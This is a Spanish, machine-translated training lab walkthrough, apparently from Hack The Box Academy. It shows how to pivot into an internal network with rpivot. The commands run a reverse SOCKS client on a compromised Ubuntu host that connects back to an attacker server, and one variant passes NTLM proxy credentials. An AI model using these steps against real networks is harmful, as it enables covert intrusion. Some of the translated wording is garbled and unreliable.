# Web Server Pivoting with Rpivot

[Rpivote](https://github.com/klsecservices/rpivot)es una herramienta de proxy de calcetines inverso escrita en Python para túneles de calcetines. RPIVOT une una máquina dentro de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor. Tomaremos el escenario a continuación, donde tenemos un servidor web en nuestra red interna (`172.16.5.135`), y queremos acceder a eso usando el proxy rpivot.

![](https://academy.hackthebox.com/storage/modules/158/77.png)

Podemos iniciar nuestro servidor proxy RPIVOT SOCKS utilizando el siguiente comando para permitir que el cliente se conecte en el puerto 9999 y escuche en el puerto 9050 para las conexiones de pivote proxy.

### **Rpivot de clonación**

Servidor web girando con rpivot

```
xnoxos@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

### **Instalación de Python2.7**

Servidor web girando con rpivot

```
xnoxos@htb[/htb]$ sudo apt-get install python2.7
```

### **Instalación alternativa de Python2.7**

Servidor web girando con rpivot

```
xnoxos@htb[/htb]$ curl https://pyenv.run | bashxnoxos@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrcxnoxos@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrcxnoxos@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrcxnoxos@htb[/htb]$ source ~/.bashrcxnoxos@htb[/htb]$ pyenv install 2.7xnoxos@htb[/htb]$ pyenv shell 2.7
```

Podemos iniciar nuestro servidor proxy RPIVOT SOCKS para conectarse a nuestro cliente en el servidor Ubuntu comprometido utilizando`server.py`.

### **Ejecutando server.py desde el host de ataque**

Servidor web girando con rpivot

```
xnoxos@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Antes de correr`client.py`Tendremos que transferir rpivot al objetivo. Podemos hacer esto usando este comando SCP:

### **Transferencia de rpivot al objetivo**

Servidor web girando con rpivot

```
xnoxos@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

```

### **Ejecutar Client.py desde Pivot Target**

Servidor web girando con rpivot

```
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port 9999

```

### **Se establece la conexión de confirmación**

Servidor web girando con rpivot

```
New connection from host 10.129.202.64, source port 35226

```

Configuraremos proxyChains para pivotar a través de nuestro servidor local en 127.0.0.1:9050 en nuestro host de ataque, que inicialmente fue inicialmente inicialmente inicial.

Finalmente, deberíamos poder acceder al servidor web en nuestro lado del servidor, que está alojado en la red interna de 172.16.5.0/23 al 172.16.5.135:80 usando ProxyChains y Firefox.

### **Navegar al servidor web objetivo utilizando proxychains**

Servidor web girando con rpivot

```
proxychains firefox-esr 172.16.5.135:80

```

![](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

Similar al proxy de pivote anterior, podría haber escenarios en los que no podemos pivotar directamente a un servidor externo (host de ataque) en la nube. Algunas organizaciones tienen[Http-proxy con autenticación NTLM](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a)configurado con el controlador de dominio. En tales casos, podemos proporcionar una opción de autenticación NTLM adicional a RPIVOT para autenticarse a través del proxy NTLM proporcionando un nombre de usuario y contraseña. En estos casos, podríamos usar RPIVOT's Client.py de la siguiente manera:

### **Conectarse a un servidor web utilizando HTTP-Proxy & NTLM Auth**

Servidor web girando con rpivot

```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

```